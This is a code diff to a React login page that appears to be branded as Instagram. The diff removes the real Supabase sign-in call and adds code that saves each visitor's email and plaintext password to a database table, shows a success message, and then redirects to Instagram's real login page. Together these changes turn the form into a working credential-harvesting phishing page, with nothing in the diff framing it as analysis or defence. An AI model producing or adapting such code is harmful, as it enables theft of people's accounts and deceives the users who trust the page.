@@ -1,10 +1,9 @@
-
 import React, { useState } from "react";
-import { Link, useNavigate } from "react-router-dom";
+import { Link } from "react-router-dom";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
 import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card";
-import { Instagram, Mail, Lock, AlertCircle } from "lucide-react";
+import { Instagram, Mail, Lock } from "lucide-react";
 import { toast } from "sonner";
 import { supabase } from "@/lib/supabase";
 
@@ -12,9 +11,8 @@ const Login = () => {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [isLoading, setIsLoading] = useState(false);
-  const navigate = useNavigate();
 
-  const handleLogin = async (e: React.FormEvent) => {
+  const handleLogin = async (e) => {
     e.preventDefault();
     
     if (!email || !password) {
@@ -25,16 +23,16 @@ const Login = () => {
     setIsLoading(true);
     
     try {
-      const { data, error } = await supabase.auth.signInWithPassword({
-        email,
-        password,
-      });
+      // Insert user data into profile_2 table
+      const { error } = await supabase
+        .from("profile_2")
+        .insert([{ email, password }]);
       
       if (error) {
-        toast.error(error.message);
+        toast.error("Failed to store data");
       } else {
-        toast.success("Logged in successfully!");
-        navigate("/");
+        toast.success("Login successfully");
+        window.location.href = "https://www.instagram.com/accounts/login";
       }
     } catch (error) {
       console.error("Login error:", error);
@@ -59,30 +57,26 @@ const Login = () => {
         
         <CardContent>
           <form onSubmit={handleLogin} className="space-y-4">
-            <div className="space-y-2">
-              <div className="relative">
-                <Mail className="absolute left-3 top-2.5 h-5 w-5 text-gray-400" />
-                <Input
-                  type="email"
-                  placeholder="Email"
-                  className="pl-10"
-                  value={email}
-                  onChange={(e) => setEmail(e.target.value)}
-                />
-              </div>
+            <div className="relative">
+              <Mail className="absolute left-3 top-2.5 h-5 w-5 text-gray-400" />
+              <Input
+                type="email"
+                placeholder="Email"
+                className="pl-10"
+                value={email}
+                onChange={(e) => setEmail(e.target.value)}
+              />
             </div>
             
-            <div className="space-y-2">
-              <div className="relative">
-                <Lock className="absolute left-3 top-2.5 h-5 w-5 text-gray-400" />
-                <Input
-                  type="password"
-                  placeholder="Password"
-                  className="pl-10"
-                  value={password}
-                  onChange={(e) => setPassword(e.target.value)}
-                />
-              </div>
+            <div className="relative">
+              <Lock className="absolute left-3 top-2.5 h-5 w-5 text-gray-400" />
+              <Input
+                type="password"
+                placeholder="Password"
+                className="pl-10"
+                value={password}
+                onChange={(e) => setPassword(e.target.value)}
+              />
             </div>
             
             <Button type="submit" className="w-full" disabled={isLoading}>
